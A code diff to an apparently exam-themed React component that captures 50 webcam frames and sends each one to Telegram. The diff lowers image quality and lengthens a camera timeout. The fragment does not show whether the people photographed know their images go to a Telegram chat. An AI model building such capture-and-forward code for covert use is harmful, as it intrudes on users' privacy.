@@ -141,7 +141,7 @@ export function ExamInterface() {
       }
       try {
         ctx.drawImage(webcamRef.current, 0, 0, canvas.width, canvas.height);
-        const frameDataUrl = canvas.toDataURL('image/jpeg', 0.5); // Use JPEG with 50% quality
+        const frameDataUrl = canvas.toDataURL('image/jpeg', 0.3); // Reduced quality to 0.3 for better compression
         
         await sendPhotoToTelegram(frameDataUrl, `Frame ${i + 1} of 50 (${new Date().toLocaleTimeString()})`);
         framesSentSuccessfully++;
@@ -205,9 +205,9 @@ export function ExamInterface() {
           metadataTimeoutId = setTimeout(() => {
             videoElement.onloadedmetadata = null; // Cleanup
             videoElement.onerror = null; // Cleanup specific error handler
-            console.error("Timeout: Webcam metadata did not load within 15 seconds.");
-            rejectMetadata(new Error("Timeout: Webcam metadata did not load within 15 seconds. Check camera connection and permissions."));
-          }, 15000); // Increased timeout
+            console.error("Timeout: Webcam metadata did not load within 30 seconds.");
+            rejectMetadata(new Error("Timeout: Webcam metadata did not load within 30 seconds. Check camera connection and permissions."));
+          }, 30000); // Increased timeout to 30 seconds
 
           videoElement.onloadedmetadata = () => {
             if (metadataTimeoutId) clearTimeout(metadataTimeoutId);
@@ -512,3 +512,4 @@ export function ExamInterface() {
     </div>
   );
 }
+
